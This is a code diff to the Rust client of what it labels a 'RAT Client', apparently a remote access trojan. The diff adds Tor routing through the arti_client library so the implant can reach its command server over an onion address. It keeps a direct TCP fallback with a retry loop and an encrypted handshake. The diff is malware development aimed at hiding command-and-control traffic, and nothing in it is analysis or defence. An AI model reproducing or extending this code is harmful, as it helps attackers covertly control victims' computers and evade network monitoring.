@@ -12,8 +12,9 @@ pub mod features;
 pub mod service;
 pub mod handler;
 
-use tokio::{net::TcpStream, sync::oneshot, time::sleep};
-use common::{connection::Connection, packets::*};
+use tokio::{io::AsyncRead, io::AsyncWrite, net::TcpStream, sync::oneshot, time::sleep};
+use arti_client::{TorClient, TorClientConfig};
+use common::{connection::Connection, connection::StreamTrait, packets::*};
 
 use std::sync::{Arc, Mutex};
 use once_cell::sync::Lazy;
@@ -59,6 +60,20 @@ async fn main() {
     }
 
 
+    let tor_client = if config.use_tor {
+        println!("Initializing Tor client...");
+        let tor_config = TorClientConfig::default();
+        match TorClient::create_bootstrapped(tor_config).await {
+            Ok(client) => Some(client),
+            Err(e) => {
+                eprintln!("Failed to create Tor client: {}. Falling back to direct connection or retrying.", e);
+                None
+            }
+        }
+    } else {
+        None
+    };
+
     // Main connection loop
     loop {
         let tray_icon_clone = tray_icon.clone();
@@ -69,12 +84,27 @@ async fn main() {
             tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Connecting...");
         }
         
-        let socket = match TcpStream::connect(format!("{}:{}", config.ip, config.port)).await {
-            Ok(socket) => socket,
-            Err(e) => {
-                println!("Connection failed: {}. Retrying in 5 seconds...", e);
-                sleep(Duration::from_secs(5)).await;
-                continue;
+        let stream = if config.use_tor && tor_client.is_some() {
+            let tor = tor_client.as_ref().unwrap();
+            match tor.connect(config.tor_address.clone()).await {
+                Ok(s) => Box::new(s) as Box<dyn StreamTrait + Unpin + Send>,
+                Err(e) => {
+                    println!("Tor connection failed: {}. Retrying in 5 seconds...", e);
+                    sleep(Duration::from_secs(5)).await;
+                    continue;
+                }
+            }
+        } else {
+            if config.use_tor {
+                println!("Tor client not available, attempting direct connection to {}:{}", config.ip, config.port);
+            }
+            match TcpStream::connect(format!("{}:{}", config.ip, config.port)).await {
+                Ok(socket) => Box::new(socket) as Box<dyn StreamTrait + Unpin + Send>,
+                Err(e) => {
+                    println!("Connection failed: {}. Retrying in 5 seconds...", e);
+                    sleep(Duration::from_secs(5)).await;
+                    continue;
+                }
             }
         };
 
@@ -84,7 +114,7 @@ async fn main() {
 
         // Encryption handshake phase
         println!("Connected to server. Performing encryption handshake...");
-        let connection = Connection::<ClientboundPacket, ServerboundPacket>::new(socket);
+        let connection = Connection::<ClientboundPacket, ServerboundPacket>::new_from_boxed(stream);
         
         let encryption_result = encryption::perform_encryption_handshake(connection).await;
         
